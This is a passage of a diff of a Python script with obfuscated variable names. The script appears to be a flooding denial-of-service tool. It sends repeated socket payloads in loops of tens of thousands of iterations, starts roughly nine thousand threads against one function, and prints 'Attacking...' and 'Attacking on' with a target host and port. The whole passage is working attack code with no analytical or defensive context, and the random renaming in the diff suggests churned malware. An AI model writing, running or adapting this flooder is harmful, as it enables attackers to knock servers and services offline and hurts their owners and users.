+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            for KXVzevohkczSgGKeMXqxqIxRJrPWDJdK in range(60000):
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+                CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+                CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+                CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.send(EQMoAHCblbZmRPfDHTugoAaLSJhQIAGX)
+                CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+                CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+                CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+                CihunXkTXricEtulpGsebiyexJWwnGCM.sendall(str.encode(tosDaEAtUCzSfGjyfrAUPcvmGNlLIWrJ))
+            print(wILVzXKJHUygYfakTGjfAkelojOOFvZv +" \033[5;37;40mAttacking...")
         except socket.error:
-            WDXAaXXzVvITezSiMiiJovTsmQbrDZlC.close()
-            print("\033[1;37;40m[!]\033[1;36;40m ronaldo \033[1;31;40m Attacking on \033[0;37;41m ",RmCpjgAquHWIvOtCeObUZlUoMRnzmPyE,":",LrsjmaLhUqnYbqeKXwlKrcHdNECHIKGZ,"|â†“|\033[0;37;40m")
-for lTQZrvEKkMLjzYguEjTJPjrewKrVlsYk in range(9024):
-    EDNKfyTjnySRpHtgayYgfnNXRZdqoTam = threading.Thread(target = pwmxSFYpIVnFDmrXHkTQPryfSyXeQRvN)
-    EDNKfyTjnySRpHtgayYgfnNXRZdqoTam.start()
+            CihunXkTXricEtulpGsebiyexJWwnGCM.close()
+            print("\033[1;37;40m[!]\033[1;36;40m ronaldo \033[1;31;40m Attacking on \033[0;37;41m ",RTYRMNjzgsCWSFFNatozGFZKdYGQmYef,":",CjiGezquJYCevYgtLijBYyKUEWrPKcsP,"|â†“|\033[0;37;40m")
+for fxRzlLnLnwEhJOxDYyDGwnHhPyrZkfPP in range(9025):
+    GmeuXsdvnDZsMclvfBMpJexNwtjXXiTF = threading.Thread(target = dEAWbFSOptmUvYBenGclVsthHzwfHLaq)
+    GmeuXsdvnDZsMclvfBMpJexNwtjXXiTF.start()
